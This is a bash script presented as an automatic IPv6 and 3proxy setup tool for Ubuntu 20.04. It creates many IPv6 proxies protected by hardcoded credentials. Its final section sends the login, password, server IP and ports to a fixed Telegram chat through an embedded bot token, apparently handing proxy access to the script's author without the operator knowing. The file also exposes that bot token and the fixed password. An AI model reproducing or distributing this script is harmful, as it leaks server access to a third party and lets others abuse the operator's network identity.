#!/bin/bash
# script for automatic setup of ipv6 on Ubuntu 20.4
#v1.01b @2021
# @ipv6setupbot

dev_chat=51337503
dev_login="wysinwyg"
dev_pass="pomidor"

mkdir /root/3proxy
cd /root/3proxy

dev_add='ip addr add '
dev_eth=' dev eth0'
dev_mask='/64'

dev_ip6=`ip a | grep 'inet6 ' | awk '{print $2}' | cut -f1 -d/ | grep -v ^::1 | grep -v ^fe80::`
for i in {1..15}; do printf "$dev_add"${dev_ip6%?}"%1x$dev_mask$dev_eth\n" $i >> ip.sh; done
sh ./ip.sh

apt-get update
apt-get install build-essential -y
/usr/bin/wget https://github.com/z3APA3A/3proxy/archive/0.9.3.tar.gz
/usr/bin/tar xzf 0.9.3.tar.gz

rm ./0.9.3.tar.gz >/dev/null 2>/dev/null
cd 3proxy-0.9.3
ln -s Makefile.Linux Makefile && make && make install

cd /root/3proxy
rm -rf ./3proxy-0.9.3 >/dev/null 2>/dev/null

ip6=`ip a | grep 'inet6 ' | awk '{print $2}' | cut -f1 -d/ | grep -v ^::1 | grep -v ^fe80::`
echo "$ip6" > ./ip6.info
ip4=`curl -s http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address`
echo "$ip4" > ./ip4.info
cat << 'EOF' > ./3proxy.cfg
nserver 8.8.8.8
nserver 2001:4860:4860::8844
timeouts 1 5 30 60 180 1800 15 60
daemon
#log /var/log/3proxy/3proxy.log D
#logformat "- +_L%t.%.  %N.%p %E %U %C:%c %R:%r %O %I %h %T"
auth strong
EOF
echo "users $dev_login:CL:$dev_pass" >> ./3proxy.cfg
echo "allow $dev_login" >> ./3proxy.cfg
num=1
port=3000
while read line
do
echo $line > ./vline
echo "proxy -6 -p$port -i$ip4 -e`cat ./vline | awk '{print $1}'`" >> ./3proxy.cfg
num=$(($num + 1))
port=$(($port + 1))
done < ./ip6.info
rm ./ip6.info >/dev/null 2>/dev/null
rm ./ip4.info >/dev/null 2>/dev/null
rm ./vline >/dev/null 2>/dev/null
/usr/bin/3proxy ./3proxy.cfg

# sending access to the client in telegrams
ip4=`ip a | grep 'inet ' | awk '{print $2}' | cut -f1 -d/ | grep -v ^127.[0-9] | grep -v ^10.[0-9] | grep -v ^192.168.[0-9] | grep -v ^172.[0-9]`
for i in {3000..3015}; do printf "curl -s -X POST https://api.telegram.org/bot1998436072:AAFYMZFP2SFK7MiF2Tq7LO8WUfFVvjoc-1Q/sendMessage -F chat_id='$dev_chat' -F text='$dev_login:$dev_pass@""$ip4:$i'\n" $i >> setd_bot.sh; done
sh setd_bot.sh
rm ./setd_bot.sh >/dev/null 2>/dev/null
